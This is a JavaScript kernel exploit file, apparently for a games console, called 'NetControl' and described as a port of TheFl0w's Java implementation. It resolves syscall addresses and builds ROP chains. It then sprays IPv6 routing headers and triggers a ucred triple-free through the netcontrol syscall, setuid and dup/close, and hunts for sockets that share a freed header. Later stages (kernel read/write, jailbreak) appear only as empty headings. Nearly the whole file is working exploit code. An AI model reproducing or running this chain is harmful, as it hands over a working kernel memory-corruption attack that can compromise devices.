include('inject.js')
include('globals.js')
include('util.js')

// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// ============================================================================
utils.notify("NetControl ð\x9F\x92\xA9 ð\x9F\x92\xA9")

// Extract required syscalls from syscalls.map
var kapi = {
  read_lo: 0, read_hi: 0, read_found: false,
  write_lo: 0, write_hi: 0, write_found: false,
  close_lo: 0, close_hi: 0, close_found: false,
  setuid_lo: 0, setuid_hi: 0, setuid_found: false,
  dup_lo: 0, dup_hi: 0, dup_found: false,
  socket_lo: 0, socket_hi: 0, socket_found: false,
  socketpair_lo: 0, socketpair_hi: 0, socketpair_found: false,
  recvmsg_lo: 0, recvmsg_hi: 0, recvmsg_found: false,
  setsockopt_lo: 0, setsockopt_hi: 0, setsockopt_found: false,
  getsockopt_lo: 0, getsockopt_hi: 0, getsockopt_found: false,
  netcontrol_lo: 0, netcontrol_hi: 0, netcontrol_found: false,
  mprotect_lo: 0, mprotect_hi: 0, mprotect_found: false
}

// Get syscall addresses from already-scanned syscalls.map
if (syscalls.map.has(0x03)) {
  var addr = syscalls.map.get(0x03)
  kapi.read_lo = addr.lo()
  kapi.read_hi = addr.hi()
  kapi.read_found = true
}
if (syscalls.map.has(0x04)) {
  var addr = syscalls.map.get(0x04)
  kapi.write_lo = addr.lo()
  kapi.write_hi = addr.hi()
  kapi.write_found = true
}
if (syscalls.map.has(0x06)) {
  var addr = syscalls.map.get(0x06)
  kapi.close_lo = addr.lo()
  kapi.close_hi = addr.hi()
  kapi.close_found = true
}
if (syscalls.map.has(0x17)) {
  var addr = syscalls.map.get(0x17)
  kapi.setuid_lo = addr.lo()
  kapi.setuid_hi = addr.hi()
  kapi.setuid_found = true
}
if (syscalls.map.has(0x29)) {
  var addr = syscalls.map.get(0x29)
  kapi.dup_lo = addr.lo()
  kapi.dup_hi = addr.hi()
  kapi.dup_found = true
}
if (syscalls.map.has(0x61)) {
  var addr = syscalls.map.get(0x61)
  kapi.socket_lo = addr.lo()
  kapi.socket_hi = addr.hi()
  kapi.socket_found = true
}
if (syscalls.map.has(0x88)) {
  var addr = syscalls.map.get(0x88)
  kapi.socketpair_lo = addr.lo()
  kapi.socketpair_hi = addr.hi()
  kapi.socketpair_found = true
}
if (syscalls.map.has(0x1B)) {
  var addr = syscalls.map.get(0x1B)
  kapi.recvmsg_lo = addr.lo()
  kapi.recvmsg_hi = addr.hi()
  kapi.recvmsg_found = true
}
if (syscalls.map.has(0x69)) {
  var addr = syscalls.map.get(0x69)
  kapi.setsockopt_lo = addr.lo()
  kapi.setsockopt_hi = addr.hi()
  kapi.setsockopt_found = true
}
if (syscalls.map.has(0x76)) {
  var addr = syscalls.map.get(0x76)
  kapi.getsockopt_lo = addr.lo()
  kapi.getsockopt_hi = addr.hi()
  kapi.getsockopt_found = true
}
if (syscalls.map.has(0x63)) {
  var addr = syscalls.map.get(0x63)
  kapi.netcontrol_lo = addr.lo()
  kapi.netcontrol_hi = addr.hi()
  kapi.netcontrol_found = true
}
if (syscalls.map.has(0x4A)) {
  var addr = syscalls.map.get(0x4A)
  kapi.mprotect_lo = addr.lo()
  kapi.mprotect_hi = addr.hi()
  kapi.mprotect_found = true
}

// Check required syscalls
if (!kapi.socket_found || !kapi.socketpair_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found || !kapi.netcontrol_found || !kapi.read_found || !kapi.write_found || !kapi.recvmsg_found) {
  log('ERROR: Required syscalls not found')
  log(' socket: ' + kapi.socket_found)
  log(' socketpair: ' + kapi.socketpair_found)
  log(' setsockopt: ' + kapi.setsockopt_found)
  log(' getsockopt: ' + kapi.getsockopt_found)
  log(' close: ' + kapi.close_found)
  log(' netcontrol: ' + kapi.netcontrol_found)
  log(' read: ' + kapi.read_found)
  log(' write: ' + kapi.write_found)
  log(' recvmsg: ' + kapi.recvmsg_found)
  log(' setuid: ' + kapi.setuid_found)
  throw new Error('Required syscalls not found')
}

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// ============================================================================

log('=== NetControl ===')


// Pre-allocate all buffers once (reuse throughout exploit)
var store_addr = mem.malloc(0x100)
var rthdr_buf = mem.malloc(UCRED_SIZE)
var optlen_buf = mem.malloc(8)

log('store_addr: ' + store_addr.toString())
log('rthdr_buf: ' + rthdr_buf.toString())

// Storage for IPv6 sockets
var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
var socket_count = 0

// Build socket() ROP chain once (reuse for all sockets)
var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
var socket_insts = build_rop_chain(
  socket_wrapper,
  new BigInt(0, AF_INET6),
  new BigInt(0, SOCK_STREAM),
  new BigInt(0, 0)
)
rop.store(socket_insts, store_addr, 1)

log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets (reuse same ROP chain and store_addr)
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  rop.execute(socket_insts, store_addr, 0x10)
  var fd = mem.read8(store_addr.add(new BigInt(0, 8)))

  if (fd.hi() === 0xFFFFFFFF) {
    log('ERROR: socket() failed at index ' + i)
    log('Return value: ' + fd.toString())
    break
  }

  ipv6_sockets[i] = fd.lo()
  socket_count++
}

log('Created ' + socket_count + ' IPv6 sockets')

if (socket_count !== IPV6_SOCK_NUM) {
  log('FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}


log('Initializing pktopts on all sockets...')

// Build setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0) ROP chain template
var init_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)

// Initialize pktopts by calling setsockopt with NULL buffer
var init_count = 0
for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  var init_insts = build_rop_chain(
    init_wrapper,
    new BigInt(0, ipv6_sockets[i]),
    new BigInt(0, IPPROTO_IPV6),
    new BigInt(0, IPV6_RTHDR),
    new BigInt(0, 0), // NULL buffer
    new BigInt(0, 0)  // size 0
  )
  rop.store(init_insts, store_addr, 1)
  rop.execute(init_insts, store_addr, 0x10)
  var ret = mem.read8(store_addr.add(new BigInt(0, 8)))

  if (ret.hi() !== 0xFFFFFFFF || ret.lo() !== 0xFFFFFFFF) {
    init_count++
  }
}

log('Initialized ' + init_count + ' pktopts')

if (init_count === 0) {
  log('FAILED: No pktopts initialized')
  throw new Error('Failed to initialize pktopts')
}



// ============================================================================
// STAGE 2: Spray routing headers
// ============================================================================




// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.write1(rthdr_buf, 0) // ip6r_nxt
mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len) // ip6r_len
mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0) // ip6r_type
mem.write1(rthdr_buf.add(new BigInt(0, 3)), rthdr_len >> 1) // ip6r_segleft
var rthdr_size = (rthdr_len + 1) << 3

log('Built routing header template (size=' + rthdr_size + ' bytes)')

// Spray routing headers with tagged values across all sockets
log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')

var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)

for (var i = 0; i < IPV6_SOCK_NUM; i++) {
  // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
  mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)

  // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  var spray_insts = build_rop_chain(
    setsockopt_wrapper,
    new BigInt(0, ipv6_sockets[i]),
    new BigInt(0, IPPROTO_IPV6),
    new BigInt(0, IPV6_RTHDR),
    rthdr_buf,
    new BigInt(0, rthdr_size)
  )
  rop.store(spray_insts, store_addr, 1)
  rop.execute(spray_insts, store_addr, 0x10)
}

log('Sprayed ' + IPV6_SOCK_NUM + ' routing headers')




// ============================================================================
// STAGE 3: Trigger ucred triple-free and find twins/triplet
// ============================================================================




// Get syscall wrappers
var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
var pthread_exit_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_EXIT_OFFSET))
var read_wrapper = new BigInt(kapi.read_hi, kapi.read_lo)
var write_wrapper = new BigInt(kapi.write_hi, kapi.write_lo)
var recvmsg_wrapper = new BigInt(kapi.recvmsg_hi, kapi.recvmsg_lo)
var socketpair_wrapper = new BigInt(kapi.socketpair_hi, kapi.socketpair_lo)
var mprotect_wrapper = kapi.mprotect_found ? new BigInt(kapi.mprotect_hi, kapi.mprotect_lo) : null

log('scePthreadCreate at: ' + pthread_create_addr.toString())
log('scePthreadExit at: ' + pthread_exit_addr.toString())
log('socketpair wrapper at: ' + socketpair_wrapper.toString())
if (mprotect_wrapper) {
  log('mprotect wrapper at: ' + mprotect_wrapper.toString())
}

// Allocate buffers
var set_buf = mem.malloc(8)
var clear_buf = mem.malloc(8)
var leak_rthdr_buf = mem.malloc(UCRED_SIZE)
var leak_len_buf = mem.malloc(8)
var tmp_buf = mem.malloc(8)

// Global variables
var twins = [-1, -1]
var triplets = [-1, -1, -1]
var uaf_sock = -1

// Try socketpair - allocate buffer in ROP writable region
log('Attempting socketpair with different buffer strategies...')

// Strategy 1: Allocate large buffer and try at different offsets
var large_buf = new Uint8Array(PAGE_SIZE * 2)
var large_backing = utils.get_backing(large_buf)
log('Large buffer backing at: ' + large_backing.toString())

// Try buffer at page boundary within our allocation
var sp_buf = new BigInt(0, (large_backing.lo() + PAGE_SIZE) & ~(PAGE_SIZE - 1))
sp_buf = new BigInt(large_backing.hi(), sp_buf.lo())
log('Page-aligned buffer within allocation at: ' + sp_buf.toString())

// Try mprotect to make entire region RWX
if (mprotect_wrapper) {
  var PROT_READ = 1
  var PROT_WRITE = 2
  var PROT_EXEC = 4
  var prot = PROT_READ | PROT_WRITE

  log('Calling mprotect(' + sp_buf.toString() + ', ' + PAGE_SIZE + ', ' + prot + ')')

  var mprotect_insts = build_rop_chain(
    mprotect_wrapper,
    sp_buf,
    new BigInt(0, PAGE_SIZE),
    new BigInt(0, prot)
  )
  rop.store(mprotect_insts, store_addr, 1)
  rop.execute(mprotect_insts, store_addr, 0x10)
  var mprotect_ret = mem.read8(store_addr.add(new BigInt(0, 8)))

  if (mprotect_ret.hi() === 0xFFFFFFFF) {
    log('WARNING: mprotect failed, return: ' + mprotect_ret.toString())
  } else {
    log('mprotect succeeded')
  }
}

var socketpair_insts = build_rop_chain(
  socketpair_wrapper,
  new BigInt(0, AF_UNIX),
  new BigInt(0, SOCK_STREAM),
  new BigInt(0, 0),
  sp_buf
)

log('Calling socketpair(AF_UNIX, SOCK_STREAM, 0, ' + sp_buf.toString() + ')')

rop.store(socketpair_insts, store_addr, 1)
rop.execute(socketpair_insts, store_addr, 0x10)
var sp_ret = mem.read8(store_addr.add(new BigInt(0, 8)))

log('socketpair returned: ' + sp_ret.toString())

if (sp_ret.hi() === 0xFFFFFFFF) {
  var errno_val = fn._error()
  var errno_int = mem.read4(errno_val)
  var errno_str = fn.strerror(errno_int)
  throw new Error('socketpair failed with errno ' + errno_int)
}

// Read results from buffer
var iov_ss0 = mem.read4(sp_buf) & 0xFFFFFFFF
var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))) & 0xFFFFFFFF
log('SUCCESS! Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')

// Prepare msg_iov buffer (iov_base=1 will become cr_refcnt)
var msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (var i = 0; i < MSG_IOV_NUM; i++) {
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE)), new BigInt(0, 1))
  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
}

// Spawn IOV workers only if socketpair succeeded
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  log('Spawning IOV worker threads...')

  // Prepare msghdr for recvmsg
  var msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)
  mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)

  // Create UNIX sockets for each worker (for recvmsg spray)
  var worker_sockets = []
  for (var w = 0; w < IOV_THREAD_NUM; w++) {
    var worker_sock_insts = build_rop_chain(
      socket_wrapper,
      new BigInt(0, AF_UNIX),
      new BigInt(0, SOCK_STREAM),
      new BigInt(0, 0)
    )
    rop.store(worker_sock_insts, store_addr, 1)
    rop.execute(worker_sock_insts, store_addr, 0x10)
    var worker_sock_result = mem.read8(store_addr.add(new BigInt(0, 8)))
    var worker_sock_fd = worker_sock_result.lo() & 0xFFFFFFFF // Ensure it's a plain integer
    worker_sockets.push(worker_sock_fd)
  }
  log('Created ' + IOV_THREAD_NUM + ' sockets for worker recvmsg spray: ' + worker_sockets.join(', '))

  var iov_workers = []
  for (var w = 0; w < IOV_THREAD_NUM; w++) {
    var worker_rop = mem.malloc(0x2000)
    var worker_rop_arr = []
    var worker_sock = worker_sockets[w]

    var loop_label = worker_rop.add(new BigInt(0, worker_rop_arr.length * 8))

    // read(pipe_read, tmp_buf, 8) - wait for signal from main thread
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, iov_ss0))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(tmp_buf)
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, 8))
    worker_rop_arr.push(read_wrapper)

    // recvmsg(worker_sock, msg_hdr, 0) - spray IOV structures
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, worker_sock))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(msg_hdr)
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, 0))
    worker_rop_arr.push(recvmsg_wrapper)

    // write(pipe_write, tmp_buf, 8) - signal completion to main thread
    worker_rop_arr.push(gadgets.POP_RDI_RET)
    worker_rop_arr.push(new BigInt(0, iov_ss1))
    worker_rop_arr.push(gadgets.POP_RSI_RET)
    worker_rop_arr.push(tmp_buf)
    worker_rop_arr.push(gadgets.POP_RDX_RET)
    worker_rop_arr.push(new BigInt(0, 8))
    worker_rop_arr.push(write_wrapper)

    // Loop back
    worker_rop_arr.push(loop_label)

    for (var r = 0; r < worker_rop_arr.length; r++) {
      mem.write8(worker_rop.add(new BigInt(0, r * 8)), worker_rop_arr[r])
    }

    var worker_func = mem.malloc(0x10)
    mem.write8(worker_func, gadgets.RET)
    mem.write8(worker_func.add(new BigInt(0, 8)), worker_rop)

    var pthread_addr = mem.malloc(8)
    var thread_name = mem.malloc(16)
    mem.write1(thread_name, 0x69)
    mem.write1(thread_name.add(new BigInt(0, 1)), 0x6F)
    mem.write1(thread_name.add(new BigInt(0, 2)), 0x76)
    mem.write1(thread_name.add(new BigInt(0, 3)), 0x5F)
    mem.write1(thread_name.add(new BigInt(0, 4)), 0x30 + w)
    mem.write1(thread_name.add(new BigInt(0, 5)), 0)

    var pthread_store = mem.malloc(0x100)
    var pthread_insts = build_rop_chain(
      pthread_create_addr,
      pthread_addr,
      new BigInt(0, 0),
      worker_func,
      new BigInt(0, 0),
      thread_name
    )
    rop.store(pthread_insts, pthread_store, 1)
    rop.execute(pthread_insts, pthread_store, 0x10)
    mem.free(pthread_store)

    var pthread_id = mem.read8(pthread_addr)
    iov_workers.push(pthread_id)

    if (w === 0 || w === IOV_THREAD_NUM - 1) {
      log('IOV worker ' + (w + 1) + '/' + IOV_THREAD_NUM + ' spawned (pthread=' + pthread_id.toString() + ')')
    }
  }

  log('All IOV workers spawned and waiting')
} else {
  log('Skipping IOV worker spawning (socketpair failed)')
}

// Create dummy socket to register with netcontrol
var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
var dummy_sock_insts = build_rop_chain(
  socket_wrapper,
  new BigInt(0, AF_UNIX),
  new BigInt(0, SOCK_STREAM),
  new BigInt(0, 0)
)
rop.store(dummy_sock_insts, store_addr, 1)
rop.execute(dummy_sock_insts, store_addr, 0x10)
var dummy_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

log('Created dummy socket: fd=' + dummy_sock)

// Register dummy socket with netcontrol
mem.write4(set_buf, dummy_sock)
var netcontrol_wrapper = new BigInt(kapi.netcontrol_hi, kapi.netcontrol_lo)
var set_insts = build_rop_chain(
  netcontrol_wrapper,
  new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // -1
  new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE),
  set_buf,
  new BigInt(0, 8)
)
rop.store(set_insts, store_addr, 1)
rop.execute(set_insts, store_addr, 0x10)

log('Registered dummy socket with netcontrol')

// Close dummy socket
var close_wrapper = new BigInt(kapi.close_hi, kapi.close_lo)
var close_insts = build_rop_chain(
  close_wrapper,
  new BigInt(0, dummy_sock)
)
rop.store(close_insts, store_addr, 1)
rop.execute(close_insts, store_addr, 0x10)

log('Closed dummy socket')

// Allocate new ucred via setuid
var setuid_wrapper = new BigInt(kapi.setuid_hi, kapi.setuid_lo)
var setuid_insts = build_rop_chain(
  setuid_wrapper,
  new BigInt(0, 1)
)
rop.store(setuid_insts, store_addr, 1)
rop.execute(setuid_insts, store_addr, 0x10)

log('Allocated ucred via setuid(1)')

// Reclaim file descriptor with new socket
rop.execute(dummy_sock_insts, store_addr, 0x10)
uaf_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

log('Reclaimed fd with UAF socket: fd=' + uaf_sock)

// Free previous ucred via setuid again
rop.execute(setuid_insts, store_addr, 0x10)

log('Freed ucred via setuid(1)')

// Unregister and trigger final free
mem.write4(clear_buf, uaf_sock)
var clear_insts = build_rop_chain(
  netcontrol_wrapper,
  new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // -1
  new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE),
  clear_buf,
  new BigInt(0, 8)
)
rop.store(clear_insts, store_addr, 1)
rop.execute(clear_insts, store_addr, 0x10)

log('Unregistered socket (triple-free triggered)')

// IOV spray to set cr_refcnt=1
if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  // Use IOV workers
  log('Spraying IOV with workers (32 iterations)...')
  for (var i = 0; i < 32; i++) {
    // Signal workers to spray
    var write_insts = build_rop_chain(
      write_wrapper,
      new BigInt(0, iov_ss1),
      tmp_buf,
      new BigInt(0, 8)
    )
    rop.store(write_insts, store_addr, 1)
    rop.execute(write_insts, store_addr, 0x10)

    // Wait for workers to complete
    var read_insts = build_rop_chain(
      read_wrapper,
      new BigInt(0, iov_ss0),
      tmp_buf,
      new BigInt(0, 8)
    )
    rop.store(read_insts, store_addr, 1)
    rop.execute(read_insts, store_addr, 0x10)
  }
  log('IOV spray complete (workers)')
} else {
  // Fallback: synchronous spray without workers
  log('Spraying IOV synchronously (no workers)...')

  var msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)
  mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)

  var spray_sock_insts = build_rop_chain(
    socket_wrapper,
    new BigInt(0, AF_UNIX),
    new BigInt(0, SOCK_STREAM),
    new BigInt(0, 0)
  )
  rop.store(spray_sock_insts, store_addr, 1)
  rop.execute(spray_sock_insts, store_addr, 0x10)
  var spray_sock = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

  for (var i = 0; i < 32; i++) {
    var recvmsg_insts = build_rop_chain(
      recvmsg_wrapper,
      new BigInt(0, spray_sock),
      msg_hdr,
      new BigInt(0, 0x80)
    )
    rop.store(recvmsg_insts, store_addr, 1)
    rop.execute(recvmsg_insts, store_addr, 0x10)
  }
  log('IOV spray complete (synchronous)')
}


// Double free ucred (only dup works - doesn't check f_hold)
var dup_wrapper = new BigInt(kapi.dup_hi, kapi.dup_lo)
var dup_insts = build_rop_chain(
  dup_wrapper,
  new BigInt(0, uaf_sock)
)
rop.store(dup_insts, store_addr, 1)
rop.execute(dup_insts, store_addr, 0x10)
var dup_fd = mem.read8(store_addr.add(new BigInt(0, 8))).lo()

var close_dup_insts = build_rop_chain(
  close_wrapper,
  new BigInt(0, dup_fd)
)
rop.store(close_dup_insts, store_addr, 1)
rop.execute(close_dup_insts, store_addr, 0x10)

log('Double freed ucred via close(dup(uaf_sock))')

// Find twins - two sockets sharing same routing header
var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
var found_twins = false

for (var attempt = 0; attempt < 10 && !found_twins; attempt++) {
  // Re-spray tags across all sockets
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)

    var spray_insts = build_rop_chain(
      setsockopt_wrapper,
      new BigInt(0, ipv6_sockets[i]),
      new BigInt(0, IPPROTO_IPV6),
      new BigInt(0, IPV6_RTHDR),
      rthdr_buf,
      new BigInt(0, rthdr_size)
    )
    rop.store(spray_insts, store_addr, 1)
    rop.execute(spray_insts, store_addr, 0x10)
  }

  // Check for twins
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))

    var get_insts = build_rop_chain(
      getsockopt_wrapper,
      new BigInt(0, ipv6_sockets[i]),
      new BigInt(0, IPPROTO_IPV6),
      new BigInt(0, IPV6_RTHDR),
      leak_rthdr_buf,
      leak_len_buf
    )
    rop.store(get_insts, store_addr, 1)
    rop.execute(get_insts, store_addr, 0x10)

    var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
    var j = val & 0xFFFF

    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
      twins[0] = i
      twins[1] = j
      found_twins = true
      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
      break
    }
  }

  if (!found_twins) {
    log('Twin search attempt ' + (attempt + 1) + '/10...')
  }
}

if (!found_twins) {
  log('FAILED: Could not find twins after 10 attempts')
  throw new Error('Failed to find twins - UAF may have failed')
}

if (iov_ss0 !== -1 && iov_ss1 !== -1) {
  log('Ucred triple-free triggered with ' + IOV_THREAD_NUM + ' IOV spray workers')
} else {
  log('Ucred triple-free triggered with synchronous IOV spray')
}
log('Found twins: socket[' + twins[0] + '] and socket[' + twins[1] + ']')

log('stage 4? UwU')

// Cleanup buffers
mem.free(store_addr)
mem.free(rthdr_buf)
mem.free(optlen_buf)
mem.free(set_buf)
mem.free(clear_buf)
mem.free(leak_rthdr_buf)
mem.free(leak_len_buf)

// ============================================================================
// STAGE 4: Leak kqueue structure 
// ============================================================================

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption 
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak 
// ============================================================================
